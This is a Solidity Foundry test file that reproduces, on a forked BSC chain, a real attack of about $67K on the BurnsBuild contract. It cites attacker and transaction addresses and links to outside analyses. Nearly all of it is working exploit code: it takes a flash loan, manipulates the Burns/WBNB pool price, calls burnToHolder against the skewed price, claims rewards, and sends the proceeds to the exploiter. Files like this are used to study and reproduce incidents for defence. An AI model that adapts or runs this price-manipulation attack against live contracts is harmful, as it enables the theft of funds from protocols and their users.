// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$67K
// Attacker : https://bscscan.com/address/0xc9fbcf3eb24385491f73bbf691b13a6f8be7c339
// Attack Contract : https://bscscan.com/address/0xb5eebf73448e22ce6a556f848360057f6aadd4e7
// Vuln Contract : https://bscscan.com/address/0x4fb9657ac5d311dd54b37a75cfb873b127eb21fd
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/bsc/0x1d0af3a963682748493f21bf9e955ce3a950bee5817401bf2486db7a0af104b4

// @Analysis
// https://twitter.com/pennysplayer/status/1754342573815238946
// https://medium.com/neptune-mutual/how-was-citadel-finance-exploited-a5f9acd0b408 (similar incident)

interface IBurnsBuild {
    function burnToHolder(uint256 amount, address _invitation) external;

    function receiveRewards(address to) external;
}

contract ContractTest is Test {
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant Burns =
        IERC20(0x91f1d3C7ddB8d5E290e71f893baD45F16E8Bd7BA);
    IWETH private constant WBNB =
        IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    DVM private constant DSP = DVM(0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F);
    Uni_Pair_V2 private constant BUSDT_WBNB =
        Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 private constant Burns_WBNB =
        Uni_Pair_V2(0x928cd66dFA268C69a37Be93BF7759dc8Ee676Bf8);
    Uni_Router_V2 private constant PancakeRouter =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IBurnsBuild private constant BurnsBuild =
        IBurnsBuild(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD);

    // address private exploiter = makeAddr("exploiter");
    address private constant exploiter =
        0xC9FBCf3EB24385491f73BbF691b13A6f8Be7C339;

    function setUp() public {
        vm.createSelectFork("bsc", 35858189);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(Burns), "Burns");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(DSP), "DSP");
        vm.label(address(BUSDT_WBNB), "BUSDT_WBNB");
        vm.label(address(Burns_WBNB), "Burns_WBNB");
        vm.label(address(PancakeRouter), "PancakeRouter");
        vm.label(address(BurnsBuild), "BurnsBuild");
        vm.label(exploiter, "Exploiter");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(exploiter),
            BUSDT.decimals()
        );
        emit log_named_decimal_uint(
            "Exploiter Burns balance before attack",
            Burns.balanceOf(exploiter),
            Burns.decimals()
        );
        // Borrow BUSDT
        bytes memory data = abi.encodePacked(uint8(49));
        DSP.flashLoan(250_000 * 1e18, 0, address(this), data);

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(exploiter),
            BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter Burns balance after attack",
            Burns.balanceOf(exploiter),
            Burns.decimals()
        );
    }

    function DSPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        BUSDTToBurns(baseAmount);

        address[] memory path = new address[](2);
        path[0] = address(Burns);
        path[1] = address(WBNB);
        uint256 amountOut1 = 50e18;
        uint256 amountOut2 = address(Burns).balance - amountOut1;
        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);

        // burnToHolder() use getAmountsOut() and Burns/WBNB pair for making calculations
        BurnsBuild.burnToHolder(amounts[0], exploiter);
        amounts = PancakeRouter.getAmountsIn(amountOut2, path);
        BurnsBuild.burnToHolder(amounts[0], exploiter);
        BurnsBuild.receiveRewards(address(this));
        WBNB.deposit{value: address(this).balance}();

        WBNBToBUSDT();
        BurnsToBUSDT();

        BUSDT.transfer(address(DSP), baseAmount);
        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
    }

    receive() external payable {}

    function BUSDTToBurns(uint256 amount) private {
        // Transfer borrowed BUSDT to BUSDT/WBNB pair and obtain WBNB to deposit to Burns/WBNB pair
        BUSDT.transfer(address(BUSDT_WBNB), amount);
        (uint112 reserveBUSDT, uint112 reserveWBNB, ) = BUSDT_WBNB
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            amount,
            reserveBUSDT,
            reserveWBNB
        );
        // Deposit WBNB to Burns/WBNB
        BUSDT_WBNB.swap(0, amountWBNB, address(Burns_WBNB), "");

        (uint112 reserveBurns, uint112 _reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveBurns
        );
        // Swap deposited WBNB to Burns tokens
        Burns_WBNB.swap(amountBurns, 0, address(this), "");
    }

    function WBNBToBUSDT() private {
        uint256 amountWBNB = WBNB.balanceOf(address(this));
        WBNB.transfer(address(BUSDT_WBNB), amountWBNB);
        (uint112 reserveBUSDT, uint112 reserveWBNB, ) = BUSDT_WBNB
            .getReserves();
        uint256 amountBUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            reserveWBNB,
            reserveBUSDT
        );
        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
    }

    function BurnsToBUSDT() private {
        Burns.transfer(address(Burns_WBNB), Burns.balanceOf(address(this)));
        (uint112 reserveBurns, uint112 reserveWBNB, ) = Burns_WBNB
            .getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(
            Burns.balanceOf(address(Burns_WBNB)) - reserveBurns,
            reserveBurns,
            reserveWBNB
        );
        Burns_WBNB.swap(0, amountWBNB, address(BUSDT_WBNB), "");

        (uint112 reserveBUSDT, uint112 _reserveWBNB, ) = BUSDT_WBNB
            .getReserves();
        uint256 amountBUSDT = PancakeRouter.getAmountOut(
            amountWBNB,
            _reserveWBNB,
            reserveBUSDT
        );
        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
    }
}
